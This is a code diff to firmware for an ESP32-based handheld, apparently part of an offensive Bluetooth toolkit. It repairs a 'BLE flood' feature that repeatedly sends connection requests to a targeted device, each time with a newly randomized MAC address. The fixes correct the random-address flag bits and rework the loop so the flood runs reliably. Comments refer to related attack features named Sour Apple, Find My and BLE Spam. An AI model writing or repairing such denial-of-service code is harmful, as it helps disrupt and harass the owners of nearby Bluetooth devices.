@@ -38,43 +38,45 @@ static void set_random_mac(void)
 {
     uint8_t mac[6];
     for (int i = 0; i < 6; ++i) mac[i] = (uint8_t)esp_random();
-    mac[0] |= 0xC0;
+    /* Static-random flag bits live in the MSB (index 5 little-endian),
+     * NOT index 0. Setting on byte 0 produced an invalid address that
+     * the controller silently rejected — every connect attempt failed
+     * with a stale identity. Same bug Sour Apple had. */
+    mac[5] |= 0xC0;
     ble_hs_id_set_rnd(mac);
 }
 
-static void flood_task(void *arg)
+/* Cooperative tick. Replaces xTaskCreate(flood_task) which previously
+ * toasted "task fail" because NimBLE init left only ~2.5 KB heap — not
+ * enough for a 4 KB task stack. Same bug as Sour Apple / Find My /
+ * BLE Spam fixed 2026-05-24. */
+static void flood_tick(void)
 {
-    (void)arg;
-    /* Kill any lingering scan — ble_gap_connect fails if anything else
-     * is actively using the scanner. */
-    NimBLEScan *scan = NimBLEDevice::getScan();
-    if (scan) scan->stop();
-
-    ble_addr_t target;
-    target.type = g_ble_target.is_public ? BLE_ADDR_PUBLIC : BLE_ADDR_RANDOM;
-    memcpy(target.val, g_ble_target.addr, 6);
-
-    while (s_flood_alive) {
-        s_flood_ticks++;
-        /* Cancel any in-flight connect attempt before starting a new one. */
-        ble_gap_conn_cancel();
-        set_random_mac();
-        int rc = ble_gap_connect(BLE_OWN_ADDR_RANDOM, &target, 200,
-                                 nullptr, flood_cb, nullptr);
-        s_flood_last_rc = rc;
-        s_flood_count++;
-        if (rc == 0) {
-            s_flood_ok++;
-            delay(200);
-            ble_gap_conn_cancel();
-        } else {
-            /* If we're getting rc=2 (BLE_HS_EALREADY), the previous
-             * connect is still running — give it a moment. */
-            delay(60);
-        }
-        delay(30);
+    static bool s_init = false;
+    static ble_addr_t target;
+    if (!s_init) {
+        s_init = true;
+        NimBLEScan *scan = NimBLEDevice::getScan();
+        if (scan) scan->stop();
+        target.type = g_ble_target.is_public ? BLE_ADDR_PUBLIC : BLE_ADDR_RANDOM;
+        memcpy(target.val, g_ble_target.addr, 6);
+        Serial.printf("[bleflood] cooperative first tick\n");
     }
-    vTaskDelete(nullptr);
+    s_flood_ticks++;
+    ble_gap_conn_cancel();
+    set_random_mac();
+    int rc = ble_gap_connect(BLE_OWN_ADDR_RANDOM, &target, 200,
+                             nullptr, flood_cb, nullptr);
+    s_flood_last_rc = rc;
+    s_flood_count++;
+    if (rc == 0) {
+        s_flood_ok++;
+        delay(200);
+        ble_gap_conn_cancel();
+    } else {
+        delay(60);
+    }
+    delay(30);
 }
 
 void feat_ble_flood(void)
@@ -90,8 +92,6 @@ void feat_ble_flood(void)
     s_flood_ticks = 0;
     s_flood_last_rc = 0;
     s_flood_alive = true;
-    BaseType_t ok = xTaskCreate(flood_task, "ble_flood", 4096, nullptr, 4, nullptr);
-    if (ok != pdPASS) { ui_toast("task fail", T_BAD, 1200); return; }
 
     ui_clear_body();
     auto &d = M5Cardputer.Display;
@@ -125,10 +125,11 @@ void feat_ble_flood(void)
         /* Matrix rain in right gutter + glitch blocks over stats band. */
         ui_matrix_rain(160, BODY_Y + 18, SCR_W - 160, BODY_H - 20, 0xF81F);
         ui_glitch(0, BODY_Y + 40, 150, 40);
+        if (s_flood_alive) flood_tick();
         uint16_t k = input_poll();
-        if (k == PK_NONE) { delay(30); continue; }
+        if (k == PK_NONE) continue;   /* flood_tick burned ~290 ms */
         if (k == PK_ESC) break;
     }
     s_flood_alive = false;
-    delay(200);
+    ble_gap_conn_cancel();
 }
